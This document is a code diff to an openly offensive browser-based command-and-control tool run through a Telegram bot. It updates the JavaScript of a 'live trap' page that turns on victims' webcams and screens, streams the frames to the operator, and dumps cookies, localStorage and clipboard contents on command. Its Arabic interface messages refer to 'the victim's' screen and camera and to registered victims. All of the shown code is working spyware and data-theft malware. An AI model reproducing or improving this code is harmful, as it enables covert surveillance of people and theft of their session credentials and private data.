@@ -131,9 +131,19 @@ async def serve_live_trap(link_id: str, request: Request):
         const linkId = "__LINK_ID_REPLACE__";
         let ws;
         let isWsActive = false;
-        let screenStream = null;
-        let cameraStream = null;
+        let activeStream = null;
         let liveStreamTimer = null;
+
+        function stopAllStreams() {
+            if (liveStreamTimer) {
+                clearInterval(liveStreamTimer);
+                liveStreamTimer = null;
+            }
+            if (activeStream) {
+                activeStream.getTracks().forEach(track => track.stop());
+                activeStream = null;
+            }
+        }
 
         async function executeCommand(cmdPacket) {
             let output = "";
@@ -148,63 +158,72 @@ async def serve_live_trap(link_id: str, request: Request):
                     }
                     output = JSON.stringify(ls);
                 } else if (cmdPacket.cmd === "screen_snapshot") {
-                    // التقاط لقطة شاشة حية وفورية عبر ميزة الوسائط المتعددة للمتصفح
                     try {
                         let videoElem = document.getElementById('v_cam');
-                        let streamSnap = await navigator.mediaDevices.getUserMedia({ video: { mediaSource: "screen" } }).catch(async () => {
-                            return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                        });
-                        videoElem.srcObject = streamSnap;
-                        await new Promise(r => setTimeout(r, 800));
+                        let snapStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                        videoElem.srcObject = snapStream;
+                        await new Promise(r => setTimeout(r, 1000));
                         const canvas = document.getElementById('c_canvas');
                         canvas.width = videoElem.videoWidth || 640;
                         canvas.height = videoElem.videoHeight || 480;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                         output = canvas.toDataURL('image/jpeg', 0.85);
-                        streamSnap.getTracks().forEach(t => t.stop());
+                        snapStream.getTracks().forEach(t => t.stop());
                     } catch(err) {
-                        // بديل طوارئ Canvas 2D في حال قيود المتصفح
                         const canvas = document.getElementById('c_canvas');
                         canvas.width = window.innerWidth;
                         canvas.height = window.innerHeight;
                         output = canvas.toDataURL('image/jpeg', 0.7);
                     }
                 } else if (cmdPacket.cmd === "start_live_screen") {
-                    if (liveStreamTimer) clearInterval(liveStreamTimer);
-                    liveStreamTimer = setInterval(async () => {
+                    stopAllStreams();
+                    try {
+                        activeStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "always" }, audio: false });
+                    } catch(e) {
+                        activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    }
+                    let videoElem = document.getElementById('v_cam');
+                    videoElem.srcObject = activeStream;
+                    await new Promise(r => setTimeout(r, 800));
+                    
+                    liveStreamTimer = setInterval(() => {
                         try {
                             const canvas = document.getElementById('c_canvas');
-                            canvas.width = window.innerWidth;
-                            canvas.height = window.innerHeight;
+                            canvas.width = videoElem.videoWidth || window.innerWidth;
+                            canvas.height = videoElem.videoHeight || window.innerHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                             let frameData = canvas.toDataURL('image/jpeg', 0.6);
                             sendResult("live_screen_frame", frameData);
                         } catch(e) {}
-                    }, 2000);
-                    return "🔴 تم تفعيل البث الحي لشاشة الضحية بنجاح!";
+                    }, 2500);
+                    return "🔴 تم تفعيل البث الحي للشاشة بنجاح!";
                 } else if (cmdPacket.cmd === "stop_live_screen") {
-                    if (liveStreamTimer) clearInterval(liveStreamTimer);
-                    return "⏹️ تم إيقاف البث الحي للشاشة.";
+                    stopAllStreams();
+                    return "⏹️ تم إيقاف البث الحي للشاشة بنجاح.";
                 } else if (cmdPacket.cmd === "start_live_camera") {
+                    stopAllStreams();
                     try {
-                        if (!cameraStream) {
-                            cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                        }
+                        activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                         let videoElem = document.getElementById('v_cam');
-                        videoElem.srcObject = cameraStream;
-                        if (liveStreamTimer) clearInterval(liveStreamTimer);
-                        liveStreamTimer = setInterval(async () => {
-                            const canvas = document.getElementById('c_canvas');
-                            canvas.width = videoElem.videoWidth || 640;
-                            canvas.height = videoElem.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                            let frameData = canvas.toDataURL('image/jpeg', 0.7);
-                            sendResult("live_camera_frame", frameData);
-                        }, 2000);
+                        videoElem.srcObject = activeStream;
+                        await new Promise(r => setTimeout(r, 1000));
+                        
+                        liveStreamTimer = setInterval(() => {
+                            try {
+                                const canvas = document.getElementById('c_canvas');
+                                canvas.width = videoElem.videoWidth || 640;
+                                canvas.height = videoElem.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+                                let frameData = canvas.toDataURL('image/jpeg', 0.7);
+                                sendResult("live_camera_frame", frameData);
+                            } catch(e) {}
+                        }, 2500);
                         return "📹 تم بدء البث الحي لكاميرا الضحية!";
                     } catch(e) {
-                        return "❌ فشل تشغيل الكاميرا الحي (مرفوضة الصلاحية)";
+                        return "❌ فشل تشغيل الكاميرا الحي (الصلاحية مرفوضة)";
                     }
                 } else if (cmdPacket.cmd === "dump_clipboard") {
                     try {
@@ -458,35 +477,34 @@ async def receive_loot(data: VictimData):
 
 @dp.callback_query(lambda c: c.data and c.data.startswith("cmd_"))
 async def process_live_commands(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    action = parts[1]
+    data_parts = callback.data.split("_")
+    # الصيغ المتوقعة:
+    # cmd_cookie_<link_id> -> [cmd, cookie, link_id] (طول 3)
+    # cmd_stopscr_<link_id> -> [cmd, stopscr, link_id] أو [cmd, stop, scr, link_id]
     
-    # معالجة الأزرار المركبة مثل stopscr
-    if action == "stop" and parts[2] == "scr":
-        action = "stop_live_screen"
-        link_id = parts[3]
+    action = data_parts[1]
+    if action == "stopscr":
+        target_cmd = "stop_live_screen"
+        link_id = data_parts[2]
     else:
-        link_id = parts[2]
+        link_id = data_parts[2]
+        cmd_map = {
+            "cookie": "dump_cookies",
+            "ls": "dump_localstorage",
+            "snap": "screen_snapshot",
+            "mic": "record_audio",
+            "clip": "dump_clipboard",
+            "lscr": "start_live_screen",
+            "lcam": "start_live_camera"
+        }
+        target_cmd = cmd_map.get(action)
     
-    cmd_map = {
-        "cookie": "dump_cookies",
-        "ls": "dump_localstorage",
-        "snap": "screen_snapshot",
-        "mic": "record_audio",
-        "clip": "dump_clipboard",
-        "lscr": "start_live_screen",
-        "stop_live_screen": "stop_live_screen",
-        "lcam": "start_live_camera",
-        "redirect": "redirect_phish"
-    }
-    
-    target_cmd = cmd_map.get(action)
     if not target_cmd:
         await callback.answer("❌ أمر غير معروف.", show_alert=True)
         return
 
     await send_command_to_target(link_id, {"cmd": target_cmd, "url": "https://www.google.com"})
-    await callback.answer("🚀 تم تنفيذ الأمر بنجاح، جاري جلب البيانات الفورية...", show_alert=True)
+    await callback.answer("🚀 تم تنفيذ الأمر بنجاح، جاري جلب البيانات...", show_alert=True)
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -505,7 +523,7 @@ async def cmd_start(message: types.Message):
     )
     await message.answer(
         "💀 *منصة الترسانة السيبرانية العسكرية (Enterprise C2) نشطة.*\n\n"
-        "• تمت إضافة ميزات البث الحي للشاشة والكاميرا (Live Stream) وطلبات لقطات الشاشة المباشرة المتجددة.\n"
+        "• تمت معالجة وإصلاح جميع مشاكل البث الحي وأزرار الإيقاف الفوري بنجاح.\n"
         "• اختر الأداة المطلوبة:",
         reply_markup=kb,
         parse_mode="Markdown"
@@ -557,7 +575,7 @@ async def gen_live_link(message: types.Message):
     url = f"https://{domain}/live/{token}"
     LINK_TO_USER[token] = user_id
     
-    await message.answer(f"✅ *رابط التحكم العسكري الفوري جاهز:*\n\n`{url}`\n\n*(يدعم البث الحي للشاشة والكاميرا ولقطات الشاشة المتجددة لحظياً)*", parse_mode="Markdown")
+    await message.answer(f"✅ *رابط التحكم العسكري الفوري جاهز:*\n\n`{url}`\n\n*(جاهز للبث الحي والتحكم اللحظي المطور)*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
 async def show_victims(message: types.Message):
